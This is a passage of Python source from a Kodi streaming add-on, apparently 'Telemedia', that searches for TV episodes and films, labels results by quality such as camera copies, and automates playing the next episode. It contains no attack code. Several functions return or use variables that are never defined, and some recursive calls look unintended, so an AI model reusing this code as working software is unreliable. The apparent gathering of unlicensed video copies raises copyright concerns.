        elif 'cam' in name:
            sou='[COLOR yellow]איכות מצלמה[/COLOR]'
        elif 'HDCAM' in name:
            sou='[COLOR yellow]איכות מצלמה[/COLOR]'
        elif 'CD1' in name:
            sou='[COLOR yellow]חלק 1[/COLOR]'
        elif 'CD2' in name:
            sou='[COLOR yellow]חלק 2[/COLOR]'
        elif 'CD3' in name:
            sou='[COLOR yellow]חלק 3[/COLOR]'
        elif 'CD4' in name:
            sou='[COLOR yellow]חלק 4[/COLOR]'
        elif 'CD5' in name:
            sou='[COLOR yellow]חלק 5[/COLOR]'
        elif 'חלק_1' in name:
            sou='[COLOR yellow]חלק 1[/COLOR]'
        elif 'חלק_2' in name:
            sou='[COLOR yellow]חלק 2[/COLOR]'
        elif 'חלק_3' in name:
            sou='[COLOR yellow]חלק 3[/COLOR]'
        elif 'חלק_4' in name:
            sou='[COLOR yellow]חלק 4[/COLOR]'
        elif 'חלק_5' in name:
            sou='[COLOR yellow]חלק 5[/COLOR]'
        elif 'ח1' in name:
            sou='[COLOR yellow]חלק 1[/COLOR]'
        elif 'ח2' in name:
            sou='[COLOR yellow]חלק 2[/COLOR]'
        elif 'ח3' in name:
            sou='[COLOR yellow]חלק 3[/COLOR]'
        elif 'ח4' in name:
            sou='[COLOR yellow]חלק 4[/COLOR]'
        elif 'ח5' in name:
            sou='[COLOR yellow]חלק 5[/COLOR]'
        elif 'חלק 1' in name:
            sou='[COLOR yellow]חלק 1[/COLOR]'
        elif 'חלק 2' in name:
            sou='[COLOR yellow]חלק 2[/COLOR]'
        elif 'חלק 3' in name:
            sou='[COLOR yellow]חלק 3[/COLOR]'
        elif 'חלק 4' in name:
            sou='[COLOR yellow]חלק 4[/COLOR]'
        elif 'חלק 5' in name:
            sou='[COLOR yellow]חלק 5[/COLOR]'
        else:
            sou=''
        menu.append([name,'','',q,sound,sou,'',''])
        if name not in all_t_links or filter_dup==False:
            
                all_t_links.append(name)
                all_results.append((name, link,mode,q,loc, icon,fan,plot,no_subs,tmdb,season,episode,original_title))
                if remote==False:
                    addLink( name, link,mode,False, icon,fan,plot,no_subs=no_subs,tmdb=tmdb,season=season,episode=episode,original_title=original_title)
    if display== 'true' and  Addon.getSetting("one_click")=='false':
        menu2 = ContextMenu_new2('plugin.video.telemedia', menu,iconimage,fanart,description)
        menu2.doModal()
        del menu2
        ret=selected_index
        if ret!=-1:
                name,link,data,icon,fan,no_subs,tmdb,season,episode,original_title,plot=d_save[ret]
                play(name,link,data,icon,fan,no_subs,tmdb,season,episode,original_title,plot,None,dd,nextup='true')
        sys.exit()
    if Addon.getSetting("one_click")=='true' and remote==False:
        if len(d_save)==0:
            xbmcgui.Dialog().ok('Telemedia','Sorry no sources found')
        else:
            name,link,data,icon,fan,no_subs,tmdb,season,episode,original_title,plot=d_save[0]
            play(name,link,data,icon,fan,no_subs,tmdb,season,episode,original_title,plot,None,dd,nextup='true')
            sys.exit()
            
    return all_results

def clear_color(name):
    new_name=name
    if '[COLOR' in name:
        regex='\](.+?)\['
        n_name=re.compile(regex).findall(name)
        if len(n_name)>0:
            new_name=n_name[0]
    return new_name
def get_rest_data(name,url,mode,iconimage,fanart,description,video_info={},data=' ',original_title=' ',id=' ',season=' ',episode=' ',tmdbid=' ',eng_name=' ',show_original_year=' ',rating=0,heb_name=' ',isr=0,generes=' ',trailer=' ',dates=' ',watched='no',fav_status='false'):
        name=name.replace("|",' ')
        description=description.replace("|",' ')
        try:
            te1=sys.argv[0]+"?url="+urllib.quote_plus(url)+"&mode="+str(mode)
            
            te2="&name="+(name)+"&iconimage="+urllib.quote_plus(iconimage)+"&fanart="+urllib.quote_plus(fanart)+"&description="+urllib.quote_plus(description.encode('utf8'))+"&heb_name="+(heb_name)+"&dates="+(dates)
            te3="&data="+str(data)+"&original_title="+(original_title)+"&id="+(id)+"&season="+str(season)
            te4="&episode="+str(episode)+"&tmdbid="+str(tmdbid)+"&eng_name="+(eng_name)+"&show_original_year="+(show_original_year)+"&isr="+str(isr)
        
        
        
        
        
            u=te1 + te2 + te3 + te4.decode('utf8')+"&fav_status="+fav_status
        except:
           reload(sys)  
           sys.setdefaultencoding('utf8')
           te1=sys.argv[0]+"?url="+urllib.quote_plus(url)+"&mode="+str(mode)
            
           te2="&name="+(name)+"&iconimage="+urllib.quote_plus(iconimage)+"&fanart="+urllib.quote_plus(fanart)+"&description="+urllib.quote_plus(description.encode('utf8'))+"&heb_name="+(heb_name)+"&dates="+(dates)
           te3="&data="+str(data)+"&original_title="+(original_title)+"&id="+(id)+"&season="+str(season)
           te4="&episode="+str(episode)+"&tmdbid="+str(tmdbid)+"&eng_name="+(eng_name)+"&show_original_year="+(show_original_year)+"&isr="+str(isr)
        
           u=te1 + te2 + te3 + te4.decode('utf8')+"&fav_status="+fav_status
        return u
def undo_get_rest_data(full_str):
    params=get_custom_params(full_str)
    for items in params:
        params[items]=params[items].replace(" ","%20")

    url=None
    name=None
    mode=None
    iconimage=None
    fanart=None
    description=' '
    original_title=' '
    fast_link=''
    data=0
    id=' '
    saved_name=' '
    prev_name=' '
    isr=0
    season="%20"
    episode="%20"
    show_original_year=0
    heb_name=' '
    tmdbid=' '
    eng_name=' '
    dates=' '
    data1='[]'
    fav_status='false'
    only_torrent='no'
    only_heb_servers='0'
    new_windows_only=False
    try:
            url=urllib.unquote_plus(params["url"])
    except:
            pass
    try:
            name=urllib.unquote_plus(params["name"])
    except:
            pass
    try:
            iconimage=urllib.unquote_plus(params["iconimage"])
    except:
            pass
    try:        
            mode=int(params["mode"])
    except:
            pass
    try:        
            fanart=urllib.unquote_plus(params["fanart"])
    except:
            pass
    try:        
            description=urllib.unquote_plus(params["description"].encode('utf-8'))
    except:
            pass
    try:        
            data=urllib.unquote_plus(params["data"])
    except:
            pass
    try:        
            original_title=(params["original_title"])
    except:
            pass
    try:        
            id=(params["id"])
    except:
            pass
    try:        
            season=(params["season"])
    except:
            pass
    try:        
            episode=(params["episode"])
    except:
            pass
    try:        
            tmdbid=(params["tmdbid"])
    except:
            pass
    try:        
            eng_name=(params["eng_name"])
    except:
            pass
    try:        
            show_original_year=(params["show_original_year"])
    except:
            pass
    try:        
            heb_name=urllib.unquote_plus(params["heb_name"])
    except:
            pass
    try:        
            isr=int(params["isr"])
    except:
            pass
    try:        
            saved_name=clean_name(params["saved_name"],1)
    except:
            pass
    try:        
            prev_name=(params["prev_name"])
    except:
            pass
    try:        
            dates=(params["dates"])
    except:
            pass
    try:        
            data1=(params["data1"])
    except:
            pass
    try:        
        
            fast_link=urllib.unquote_plus(params["fast_link"])
    except:
            pass
    try:        
        
            fav_status=(params["fav_status"])
    except:
            pass
    try:        
        
            only_torrent=(params["only_torrent"])
    except:
            pass
    try:        
        
            only_heb_servers=(params["only_heb_servers"])
    except:
            pass
    try:        
           
            new_windows_only=(params["new_windows_only"])
            new_windows_only = new_windows_only == "true" 
    except:
            pass
    return heb_name,year,original_title,data,iconimage,fanart,season,episode,tmdb
def load_test_data(title,icon,fanart,plot,s_title,season,episode,list):
    test_episode = {"episodeid": 0, "tvshowid": 0, "title": title, "art": {}}
    test_episode["art"]["tvshow.poster"] = icon
    test_episode["art"]["thumb"] = icon
    test_episode["art"]["tvshow.fanart"] = fanart
    test_episode["art"]["tvshow.landscape"] =fanart
    test_episode["art"]["tvshow.clearart"] = fanart
    test_episode["art"]["tvshow.clearlogo"] = icon
    test_episode["plot"] = plot
    test_episode["showtitle"] =s_title
    test_episode["playcount"] = 1
    test_episode["season"] =int( season)
    test_episode["episode"] = int(episode)
    test_episode["seasonepisode"] = "%sx%s"%(season,episode)
    test_episode["rating"] = None
    test_episode["firstaired"] = ""
    test_episode["list"]=list
    return test_episode
def calculate_progress_steps(period):
                    return (100.0 / int(period)) / 10
def search_next(dd,tv_movie,id):
   global silent,list_index,str_next,break_jump,sources_searching,clicked
   #xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'Please Wait....')))
   try:
    list_index=999
    count_timeout_sources=0
    while sources_searching:
        xbmc.sleep(100)
        count_timeout_sources+=1
        if count_timeout_sources>6:
            logging.warning('Timeout Search Sources')
            return 0
    logging.warning('Done Sources Searching')
    # tv_movie=='tv'
    # if tv_movie=='tv':
        

                
    time_to_save_trk=int(Addon.getSetting("time_to_save"))
    logging.warning('Waiting for jump')
    logging.warning(xbmc.Player().isPlaying())
    timeout=0
    break_jump=1
    done=0
    
    if tv_movie=='tv':
      time_to_window=int(Addon.getSetting("window"))
      # xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'Please Wait....')))
    else:
        time_to_window=int(Addon.getSetting("movie_window"))
    time_left=999999
    while timeout<200:
        timeout+=1
        if break_jump==0:
            break
        if xbmc.Player().isPlaying():
            break
        xbmc.sleep(100)
    play_next=False
    while xbmc.Player().isPlaying():
        if break_jump==0:
            break
        try:
        
            vidtime = xbmc.Player().getTime()
        except Exception as e:
            vidtime=0
            pass
        #logging.warning('Waiting for Vid2:'+str(vidtime))
        
        if vidtime>10:
            try:
               
                g_timer=xbmc.Player().getTime()
                g_item_total_time=xbmc.Player().getTotalTime()
                time_left=xbmc.Player().getTotalTime()-xbmc.Player().getTime()
                
            except Exception as e:
                logging.warning('Takt Err:'+str(e))
                pass
            if (time_left<time_to_window) :
              logging.warning('Ready to play next')
              play_next=True
              break
        xbmc.sleep(100)
    if break_jump==0:
            return 0
    if play_next:
      logging.warning('Play next')
      logging.warning(tv_movie)
      if tv_movie=='tv' and Addon.getSetting("play_nextup_tv")=='true' :
        name_n=''
        image_n=''
        plot_n=''
        season=''
        episode=''
        # list=''
        # from resources.modules.tmdb import get_episode_data
        # name_n,plot_n,image_n,season,episode=get_episode_data(id,season,str(int(episode)))
        
        next_up_page = UpNext("script-upnext-upnext.xml",Addon.getAddonInfo('path'), "DefaultSkin", "1080i")
                                              
        # ep=load_test_data(name_n,image_n,image_n,plot_n,name_n,season,episode,list)
        
        # next_up_page.setItem()

        next_up_page.setProgressStepSize(calculate_progress_steps(30))
        next_up_page.doModal()
        del next_up_page

        
        # xbmc.executebuiltin(('XBMC.PlayMedia("plugin://plugin.video.telemedia/?data=%s&dates=EMPTY&description=%s&eng_name=%s&episode=%s&fanart=%s&heb_name=%s&iconimage=%s&id=%s&isr=0&mode=20&name=%s&original_title=%s&season=%s&show_original_year=%s&tmdbid=EMPTY&url=%s&fast_link=%s",return)'%(data,urllib.quote_plus(description),eng_name,str(int(episode)+1),urllib.quote_plus(fanart),heb_name,urllib.quote_plus(iconimage),id,name,original_title,season,show_original_year,urllib.quote_plus(fast_link),urllib.quote_plus(fast_link))).replace('EMPTY','%20'))
        # logging.warning('clicked:'+str(clicked))
        # if (Addon.getSetting('play_nextup_wait'))=='false' :
                    # return '0'
        if list_index!=999 and list_index!=888:

            xbmc.Player().stop()
            global stopnext
            stopnext = True
            # xbmc.sleep(2)
            # logging.warning('Stoped')
            # if len(list)==0:
                # # xbmc.executebuiltin((u'Notification(%s,%s)' % ('Shadow', 'No links found')))
                # # sys.exit()
                # # stopnext = False
                # # stopnext = False
                # sys.exit()
                
        else:
            return '0'
            
        dd=[]
        dd.append((name,data,original_title,id,season,episode,show_original_year))

        # try:
            # from sqlite3 import dbapi2 as database
        # except:
            # from pysqlite2 import dbapi2 as database
        # cacheFile=os.path.join(user_dataDir,'database.db')
        # dbcon = database.connect(cacheFile)
        # dbcur = dbcon.cursor()
        # dbcur.execute("CREATE TABLE IF NOT EXISTS %s ( ""data TEXT);" % 'nextup')
        # dbcur.execute("CREATE TABLE IF NOT EXISTS %s ( ""data TEXT);" % 'nextup_all_d')
        # dbcur.execute("DELETE FROM nextup")
        # dbcur.execute("DELETE FROM nextup_all_d")
        # dbcur.execute("INSERT INTO nextup Values ('%s')"%(json.dumps(dd).encode('base64')))
        # dbcur.execute("INSERT INTO nextup_all_d Values ('%s')"%(json.dumps(all_dd).encode('base64')))
        # dbcon.commit()
        
        # dbcur.close()
        # dbcon.close()
        # logging.warning('Nextup episode:'+episode)
    
        str_next='XBMC.RunPlugin("plugin://plugin.video.telemedia/?nextup=true&url=%s&no_subs=0&season=%s&episode=%s&mode=20&original_title=%s&id=%s&dd=%s&data=%s&fanart=%s&iconimage=%s&name=%s&description=%s")'%(urllib.quote_plus(fast_link),season,episode,original_title,id,dd,data,fanart,iconimage,name_n,plot_n)
        xbmc.executebuiltin(str_next)
      else:
        if  Addon.getSetting("play_nextup_movie")=='true': 
            window = fav_mv('plugin.video.telemedia',id)
            window.doModal()

            del window
                    
    logging.warning('Next Episode Done')
   except Exception as e:
    import linecache
    sources_searching=False
    exc_type, exc_obj, tb = sys.exc_info()
    f = tb.tb_frame
    lineno = tb.tb_lineno
    filename = f.f_code.co_filename
    linecache.checkcache(filename)
    line = linecache.getline(filename, lineno, f.f_globals)
    logging.warning('ERROR IN Play IN:'+str(lineno))
    logging.warning('inline:'+line)
    logging.warning('Error:'+str(e))
    xbmc.executebuiltin((u'Notification(%s,%s)' % ('Error', 'PlayinLine:'+str(lineno))))
   
    pass
# window = fav_mv('plugin.video.allmoviesin','603')
# window.doModal()

# del window
# def load_test_data_test(list):
  
    # test_episode = {"episodeid": 0, "tvshowid": 0, "title": 'Test EP', "art": {}}
    # test_episode["art"]["tvshow.poster"] = 'https://static.episodate.com/images/tv-show/full/4014.jpg'
    # test_episode["art"]["thumb"] = 'https://static.episodate.com/images/tv-show/full/4014.jpg'
    # test_episode["art"]["tvshow.fanart"] = 'http://images6.fanpop.com/image/photos/32500000/Baka-Test-Episode-baka-to-test-to-shoukanjuu-32591144-720-532.png'
    # test_episode["art"]["tvshow.landscape"] ='http://images6.fanpop.com/image/photos/32500000/Baka-Test-Episode-baka-to-test-to-shoukanjuu-32591144-720-532.png'
    # test_episode["art"]["tvshow.clearart"] = 'http://images6.fanpop.com/image/photos/32500000/Baka-Test-Episode-baka-to-test-to-shoukanjuu-32591144-720-532.png'
    # test_episode["art"]["tvshow.clearlogo"] = 'https://static.episodate.com/images/tv-show/full/4014.jpg'
    # test_episode["plot"] = 'Plot'
    
    # test_episode["showtitle"] ='Test EP'
    # test_episode["playcount"] = 1
    # test_episode["season"] =int( 1)
    # test_episode["episode"] = int(1)
    # test_episode["seasonepisode"] = "%sx%s"%(1,1)
    # test_episode["rating"] = None
    # test_episode["firstaired"] = ""
    # test_episode['list']=list
    # return test_episode
# def calculate_progress_steps(period):
                    # return (100.0 / int(period)) / 10
                    
# list=['[COLOR yellow]\xd7\xa0\xd7\x99\xd7\x92\xd7\x95\xd7\x9f \xd7\x90\xd7\x95\xd7\x98\xd7\x95\xd7\x9e\xd7\x98\xd7\x99[/COLOR]$$$$$$$autoPlay', '[COLOR yellow]101%[/COLOR]-[COLOR gold]480[/COLOR][COLOR lightblue]-sdarot-[/COLOR]-[COLOR kodi][sdarot] \xd7\xa6\'\xd7\x90\xd7\xa7 - Direct[/COLOR]$$$$$$$["58", "4", "2"]']
# next_up_page = UpNext("script-upnext-upnext.xml",Addon.getAddonInfo('path'), "DefaultSkin", "1080i")
                                          
# ep=load_test_data_test(list)

# next_up_page.setItem(ep)

# next_up_page.setProgressStepSize(calculate_progress_steps(30))
# next_up_page.doModal()
# del next_up_page
def search_tv(heb_name,year,original_title,data,iconimage,fanart,season,episode,tmdb,remote=False):
    global stopnext
    display=Addon.getSetting("new_source")
    heb_name=clear_color(heb_name)
    logging.warning('heb_name:'+heb_name)
    logging.warning('original_title:'+original_title)
    original_title=original_title.replace('%20',' ')
    global list_index ,playing_file
    if len(episode)==1:
      episode_n="0"+episode
    else:
       episode_n=episode
    if len(season)==1:
      season_n="0"+season
    else:
      season_n=season
    all_links=[]
    all_linkss=[]
    all_plot=[]
    all_server_name=[]
    c_original=original_title.replace('%20','.').replace(' ','.').replace('%27',"'").replace("'","").replace('%3a',":")
    options=[heb_name+' ע%s פ%s'%(season,episode),heb_name+ ' פרק %s '% (episode),heb_name+ ' פ%s '% (episode),heb_name+' ע%sפ%s'%(season,episode),heb_name+' עונה %s פרק %s'%(season,episode),c_original+'.S%sE%s'%(season_n,episode_n),c_original+'.S%sE%s'%(season,episode)]
    #if 'the' in original_title.lower():
    #    options.append(c_original.replace('The','').replace('the','')+'.S%sE%s'%(season_n,episode_n))
    
    
    
    
    options2=[' ע%s פ%s'%(season,episode),' פרק %s '% (episode),' פ%s '% (episode),'ע%s.פ%s'%(season,episode),' ע%sפ%s'%(season,episode),' עונה %s פרק %s'%(season,episode),'.S%sE%s'%(season_n,episode_n),'.S%sE%s'%(season,episode)]
    # try:
    for items in options:
        logging.warning(items)
        # try:
        all_links=all_links+searchtmdb(tmdb,'all','0$$$0',items,iconimage,fanart,season,episode,no_subs=1,original_title=original_title,heb_name=heb_name,dont_return=False,manual=False)
        # except Exception as e:
         # xbmc.executebuiltin((u'Notification(%s,%s)' % ('Telemedia', 'יש להתחבר לטלמדיה...')))
    if Addon.getSetting("order_by")=='0':
        
        all_links=sorted(all_links, key=lambda x: x[4], reverse=False)
    else:
        all_links=sorted(all_links, key=lambda x: x[1], reverse=False)
    exclude=[]
    filter_dup=Addon.getSetting("dup_links")=='true'
    logging.warning(filter_dup)
    all_t_links=[]
    
        
    logging.warning('Results:')
    once=0
    d_save=[]
    menu=[]
    next_ep=[]
    list=[]
    real_index=0
    all_s_names=[]
    fast_link=' '
    f_name='[COLOR peru] ◄ [/COLOR]'
    
    if season!=None and season!="%20":
     episode1=str(int(episode)+1)
     if len(episode1)==1:
          episode_n1="0"+episode1
     else:
           episode_n1=episode1

     from resources.modules.tmdb import get_episode_data
     name1,plot1,image1,ss,ee=get_episode_data(id,season,episode1,yjump=False)
     logging.warning('NAME1:'+plot1+' S%sE%s'%(season,episode1))
     
     
     next_ep.append(get_rest_data( f_name+'[COLOR gold][I]מעבר לפרק הבא - %s[/I][/COLOR]'%episode1, url,20,iconimage,image1,plot1+'-NEXTUP-',data=year,original_title=original_title,season=season,episode=episode1,id=id,eng_name=eng_name,show_original_year=show_original_year,heb_name=heb_name,isr=isr,dates=dates,fav_status=fav_status))
     if len(next_ep)>0:
        if 'העונה הבאה' in next_ep[0]:
            txt_ep_nex='פתח את הפרק של העונה הבאה'
        elif 'סדרה חדשה' in next_ep[0]:
           
           txt_ep_nex='המלצה לסדרה חדשה'
           if 'סדרה נגמרה' in next_ep[0]:
            txt_ep_nex=' הסדרה נגמרה.. ' +txt_ep_nex
           if 'המתן לעונה הבאה' in next_ep[0]:
            txt_ep_nex=' המתן לעונה הבאה.. '+txt_ep_nex
        else:
            txt_ep_nex='פתח את מקורות הפרק הבא'

     # addDir4( f_name+'[COLOR orange][I]מעבר לפרק הבא - %s[/I][/COLOR]'%episode1, url,20,iconimage,image1,plot1+'-NEXTUP-',data=year,original_title=original_title,season=season,episode=episode1,id=id,eng_name=eng_name,show_original_year=show_original_year,heb_name=heb_name,isr=isr,dates=dates,fav_status=fav_status)
    

    # before_end=int(Addon.getSetting("before_end2"))
    # show_window=False
    # counter=0
    # while xbmc.Player().isPlaying():
        # xbmc.executebuiltin((u'Notification(%s,%s)' % ('Telemedia', 'vvvvvvvv')))
        # try:
            # vidtime = xbmc.Player().getTime()
        # except:
            # vidtime=0
        # try:
            # time_left=xbmc.Player().getTotalTime()-xbmc.Player().getTime()
        # except:
            # time_left=99999999
        # if time_left<(before_end+1) and time_left>0:
            # logging.warning('Time left')
            # logging.warning(time_left)
            # logging.warning(before_end)
            # show_window=True
            # break
        # xbmc.sleep(500)
    
    # if show_window:
        # xbmc.executebuiltin((u'Notification(%s,%s)' % ('Telemedia', 'vvvvvvvv')))
    for  name, link,mode,q,loc, icon,fan,plot,no_subs,tmdb,season,episode,original_title in all_links:
        
        if name not in all_t_links or filter_dup==False:
            all_t_links.append(name)
            

            ok=False
            o_name=heb_name
            for items in options2:
                    t_items=items.replace(' ','.').replace(':','').replace("'","").replace('-','.').replace('[','').replace(']','').replace('..','.').lower()
                    t_name=name.replace('"',"").replace('  ',' ').lower().replace('-','.').replace(' ','.').replace('[','').replace(']','').replace('_','.').replace(':','').replace("'","").replace('..','.')
                    t_items2=c_original.replace(' ','.').replace(':','').replace("'","").replace('-','.').replace('[','').replace(']','').replace('..','.').lower()
                    if (t_items+'.'  in t_name+'.') or (t_items+' '  in t_name+' ') or (t_items+'_'  in t_name+'_') or (t_items.replace('.','_')+'_'  in t_name.replace('.','_')+'_') or (t_items.replace('.','-')+'_'  in t_name.replace('.','-')+'_'):
                       if (o_name in name) or (t_items2 in t_name):
                        ok=True
                        break
            
            if not ok:
                logging.warning('Not Ok')
                logging.warning(t_items)
                logging.warning(t_name)
                exclude.append((name, link,mode,q,loc, icon,fan,plot,no_subs,tmdb,season,episode,original_title))
            else:
                  
                  if once==0:
                    # once=1
                    if '5.1' in name:
                        sound='[COLOR red]5.1[/COLOR]'
                    elif '6CH' in name:
                        sound='[COLOR red]5.1[/COLOR]'
                    elif 'מדובב' in name:
                        sound='[COLOR yellow]מדובב[/COLOR]'
                    elif 'ת.מ' in name:
                        sound='[COLOR yellow]תרגום מובנה[/COLOR]'

                    else:
                        sound=''
                    if 'BluRay' in name:
                        sou='[COLOR blue]BluRay[/COLOR]'
                    elif 'HDCam' in name:
                        sou='[COLOR yellow]איכות מצלמה[/COLOR]'
                    else:
                        sou=''
                    menu.append([name,q, '',q,sound,sou,'',''])
                    d_save.append((name,link,data,icon,fan,no_subs,tmdb,season,episode,original_title,plot))
                  addLink( name, link,mode,False, icon,fan,plot,no_subs=no_subs,tmdb=tmdb,season=season,episode=episode,original_title=original_title)

    list.append('[COLOR khaki][I]►►► %s ◄◄◄[/I][/COLOR]'%txt_ep_nex+'$$$$$$$'+next_ep[0])
    menu.append([txt_ep_nex, '','','','','',next_ep[0],''])
    all_linkss.append(next_ep[0])

    all_s_names.append(txt_ep_nex)
    all_plot.append(txt_ep_nex)
    all_server_name.append('0')

    fast_link=all_linkss[real_index]
    # su='[COLOR lightgreen]יש כתוביות (M)[/COLOR]'
    # tet_txt='אמור לצאת ב: '
    # res='[COLOR pink]לא ידוע[/COLOR]'

    # response=xbmcgui.Dialog().yesno('מה לעשות?', su+' - '+res+'\n'+tet_txt, yeslabel='המשך', nolabel='עצור')
    # if not response:
        # sys.exit()
    # heb_name,year,original_title,data,iconimage,fanart,season,episode,tmdb=undo_get_rest_data(fast_link)
    # search_tv(heb_name,year,original_title,data,iconimage,fanart,season,episode,tmdb,next_ep)


    # if stopnext is True : # ניגון מהיר עובד רק בבחירת תצוגות החדש

        # stopnext = False
        
        # name,link,data,icon,fan,no_subs,tmdb,season,episode,original_title,plot=d_save[0]
        # play(name,link,data,icon,fan,no_subs,tmdb,season,episode,original_title,plot,None,dd,nextup='true')
        # heb_name,year,original_title,data,iconimage,fanart,season,episode,tmdb=undo_get_rest_data(fast_link)
        # search_tv(heb_name,year,original_title,data,iconimage,fanart,season,episode,tmdb,next_ep)

    
        # break
    # if Addon.getSetting("one_click2")=='true':
        # name,link,data,icon,fan,no_subs,tmdb,season,episode,original_title,plot=d_save[0]
        # play(name,link,data,icon,fan,no_subs,tmdb,season,episode,original_title,plot,None,dd,nextup='true')
        # su=''
        # tet_txt=f_name+'[COLOR orange][B]%s[/B][/COLOR][COLOR gold][B]פתח מקורות לפרק מספר: [/B][/COLOR]'%episode1

        # response=xbmcgui.Dialog().yesno('                                 מעבר לפרק הבא', su+'  '+'\n'+tet_txt, nolabel='לא', yeslabel='כן')
        # if not response:
            # sys.exit()
        # heb_name,year,original_title,data,iconimage,fanart,season,episode,tmdb=undo_get_rest_data(fast_link)
        # search_tv(heb_name,year,original_title,data,iconimage,fanart,season,episode,tmdb,next_ep)
    
        # heb_name,year,original_title,data,iconimage,fanart,season,episode,tmdb=undo_get_rest_data(fast_link)
        # search_tv(heb_name,year,original_title,data,iconimage,fanart,season,episode,tmdb,next_ep)
    
    
    if Addon.getSetting("one_click")=='true' and remote==False:
        if len(d_save)==0:
            xbmcgui.Dialog().ok('Telemedia','Sorry no sources found')
        else:
            name,link,data,icon,fan,no_subs,tmdb,season,episode,original_title,plot=d_save[0]
            play(name,link,data,icon,fan,no_subs,tmdb,season,episode,original_title,plot,None,dd,nextup='true')
            heb_name,year,original_title,data,iconimage,fanart,season,episode,tmdb=undo_get_rest_data(fast_link)
            search_tv(heb_name,year,original_title,data,iconimage,fanart,season,episode,tmdb,next_ep)


    if stopnext is True and Addon.getSetting("one_click")=='true': 

        stopnext = False
        
        name,link,data,icon,fan,no_subs,tmdb,season,episode,original_title,plot=d_save[0]
        play(name,link,data,icon,fan,no_subs,tmdb,season,episode,original_title,plot,None,dd,nextup='true')
        heb_name,year,original_title,data,iconimage,fanart,season,episode,tmdb=undo_get_rest_data(fast_link)
        search_tv(heb_name,year,original_title,data,iconimage,fanart,season,episode,tmdb,next_ep)






    link_show=Addon.getSetting("fix_link")
    if link_show=='false':
      addNolink( '[COLOR lightblue][I]/////////////[/I][/COLOR]', 'www',99,False,iconimage=iconimage,fan=fanart)
      kk='[COLOR lightblue][I]/////////////[/I][/COLOR]'
      menu.append([kk,'','','','','','',''])
    for  name, link,mode,q,loc, icon,fan,plot,no_subs,tmdb,season,episode,original_title in exclude:
        
            if remote==False and link_show=='false':
                addLink( name, link,mode,False, icon,fan,plot,no_subs=no_subs,tmdb=tmdb,season=season,episode=episode,original_title=original_title)
                
                if '5.1' in name:
                    sound='[COLOR red]5.1[/COLOR]'
                elif '6CH' in name:
                    sound='[COLOR red]5.1[/COLOR]'
                elif 'מדובב' in name:
                    sound='[COLOR yellow]מדובב[/COLOR]'
                elif 'ת.מ' in name:
                    sound='[COLOR yellow]תרגום מובנה[/COLOR]'

                else:
                    sound=''
                if 'BluRay' in name:
                    sou='[COLOR blue]BluRay[/COLOR]'
                elif 'HDCam' in name:
                    sou='[COLOR yellow]איכות מצלמה[/COLOR]'
                else:
                    sou=''
                menu.append(['[COLOR orange]'+name+'[/COLOR]','', '',q,sound,sou,'',''])
                
                
                
    if display== 'true' and  Addon.getSetting("one_click")=='false':
        menu2 = ContextMenu_new2('plugin.video.telemedia', menu,iconimage,fanart,description)
        menu2.doModal()
        stopnext = False
        del menu2
        ret=selected_index
        try:
           if ret!=-1:
               name,link,data,icon,fan,no_subs,tmdb,season,episode,original_title,plot=d_save[ret]
               play(name,link,data,icon,fan,no_subs,tmdb,season,episode,original_title,plot,None,dd,nextup='true')
        except Exception as e:

               heb_name,year,original_title,data,iconimage,fanart,season,episode,tmdb=undo_get_rest_data(fast_link)
               search_tv(heb_name,year,original_title,data,iconimage,fanart,season,episode,tmdb,next_ep)
               
        # sys.exit()
        # global stopnext
        if stopnext is True:
                heb_name,year,original_title,data,iconimage,fanart,season,episode,tmdb=undo_get_rest_data(fast_link)
                search_tv(heb_name,year,original_title,data,iconimage,fanart,season,episode,tmdb,next_ep)
                
        sys.exit()
        # su=''
        # tet_txt=f_name+'[COLOR orange][B]%s[/B][/COLOR][COLOR gold][B]פתח מקורות לפרק מספר: [/B][/COLOR]'%episode1

        # response=xbmcgui.Dialog().yesno('                                     מעבר לפרק הבא', su+'  '+'\n'+tet_txt, yeslabel='כן', nolabel='לא')
        # if not response:
            # sys.exit()
        # heb_name,year,original_title,data,iconimage,fanart,season,episode,tmdb=undo_get_rest_data(fast_link)
        # search_tv(heb_name,year,original_title,data,iconimage,fanart,season,episode,tmdb,next_ep)
        
    return all_links 

def search_nexttv(heb_name,year,original_title,data,iconimage,fanart,season,episode,tmdb,remote=False):

    display=Addon.getSetting("new_source")
    heb_name=clear_color(heb_name)
    logging.warning('heb_name:'+heb_name)
    logging.warning('original_title:'+original_title)
    original_title=original_title.replace('%20',' ')
    global list_index ,playing_file
    if len(episode)==1:
      episode_n="0"+episode
    else:
       episode_n=episode
    if len(season)==1:
      season_n="0"+season
    else:
      season_n=season
    all_links=[]
    all_linkss=[]
    all_plot=[]
    all_server_name=[]
    c_original=original_title.replace('%20','.').replace(' ','.').replace('%27',"'").replace("'","").replace('%3a',":")
    options=[heb_name+' ע%s פ%s'%(season,episode),heb_name+' ע%sפ%s'%(season,episode),heb_name+' עונה %s פרק %s'%(season,episode),c_original+'.S%sE%s'%(season_n,episode_n),c_original+'.S%sE%s'%(season,episode)]
    #if 'the' in original_title.lower():
    #    options.append(c_original.replace('The','').replace('the','')+'.S%sE%s'%(season_n,episode_n))
    options2=[' ע%s פ%s'%(season,episode),'ע%s.פ%s'%(season,episode),' ע%sפ%s'%(season,episode),' עונה %s פרק %s'%(season,episode),'.S%sE%s'%(season_n,episode_n),'.S%sE%s'%(season,episode)]
    for items in options:
        logging.warning(items)
        # try:
        all_links=all_links+search(tmdb,'all','0$$$0',items,iconimage,fanart,season,episode,no_subs=1,original_title=original_title,heb_name=heb_name,dont_return=False,manual=False)
        # except Exception as e:
         # xbmc.executebuiltin((u'Notification(%s,%s)' % ('Telemedia', 'יש להתחבר לטלמדיה...')))
    if Addon.getSetting("order_by")=='0':
        
        all_links=sorted(all_links, key=lambda x: x[4], reverse=False)
    else:
        all_links=sorted(all_links, key=lambda x: x[1], reverse=False)
    exclude=[]
    filter_dup=Addon.getSetting("dup_links")=='true'
    logging.warning(filter_dup)
    all_t_links=[]
    
        
    logging.warning('Results:')
    once=0
    d_save=[]
    menu=[]
    next_ep=[]
    list=[]
    real_index=0
    all_s_names=[]
    fast_link=' '
    f_name='[COLOR peru] ◄ [/COLOR]'
    if season!=None and season!="%20":
         episode1=str(int(episode)+1)
    if len(episode1)==1:
          episode_n1="0"+episode1
    else:
           episode_n1=episode1

    for  name, link,mode,q,loc, icon,fan,plot,no_subs,tmdb,season,episode,original_title in all_links:
        
        if name not in all_t_links or filter_dup==False:
            all_t_links.append(name)
            

            ok=False
            o_name=heb_name
            for items in options2:
